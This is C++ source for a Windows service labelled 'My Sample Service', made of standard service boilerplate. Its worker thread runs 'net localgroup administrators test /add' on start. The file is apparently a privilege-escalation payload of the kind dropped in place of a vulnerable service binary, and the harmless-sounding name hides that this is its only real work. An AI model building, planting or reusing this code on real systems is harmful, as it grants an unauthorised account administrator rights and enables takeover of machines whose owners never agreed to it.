#include <windows.h>
#include <string>
#include <iostream>


SERVICE_STATUS        g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
VOID WINAPI ServiceCtrlHandler(DWORD);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);

const wchar_t SERVICE_NAME[] = L"My Sample Service";

bool CreateAndWriteFile(const std::wstring& filePath, const std::string& data);

int main(int argc, TCHAR* argv[])
{
    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        { const_cast<LPWSTR>(SERVICE_NAME), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
    {
        DWORD dwError = GetLastError();
        std::cerr << "StartServiceCtrlDispatcher error: " << dwError << std::endl;
        return dwError;
    }

    return 0;
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
{
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

    if (g_StatusHandle == NULL)
    {
        exit(GetLastError());
    }

    ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
    {
        OutputDebugStringW(L"My Sample Service: ServiceMain: SetServiceStatus returned error");
    }

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL)
    {
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        g_ServiceStatus.dwCheckPoint = 1;

        if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
        {
            OutputDebugStringW(L"My Sample Service: ServiceMain: SetServiceStatus returned error");
        }
        exit(0);
    }

    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
    {
        OutputDebugStringW(L"My Sample Service: ServiceMain: SetServiceStatus returned error");
    }

    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(g_ServiceStopEvent);

    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;

    if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
    {
        OutputDebugStringW(L"My Sample Service: ServiceMain: SetServiceStatus returned error");
    }

EXIT:
    return;
}

VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
{
    switch (CtrlCode)
    {
    case SERVICE_CONTROL_STOP:

        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        g_ServiceStatus.dwCheckPoint = 4;

        if (SetServiceStatus(g_StatusHandle, &g_ServiceStatus) == FALSE)
        {
            OutputDebugStringW(L"My Sample Service: ServiceCtrlHandler: SetServiceStatus returned error");
        }
        SetEvent(g_ServiceStopEvent);
        break;

    default:
        break;
    }
}

bool CreateAndWriteFile(const std::wstring& filePath, const std::string& data) {
    HANDLE hFile = CreateFile(
        filePath.c_str(),
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return false;
    }

    DWORD bytesWritten;

    if (!WriteFile(hFile, data.c_str(), data.size(), &bytesWritten, NULL)) {
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);
    return true;
}

DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
{
    system("net localgroup administrators test /add");
    return ERROR_SUCCESS;
}
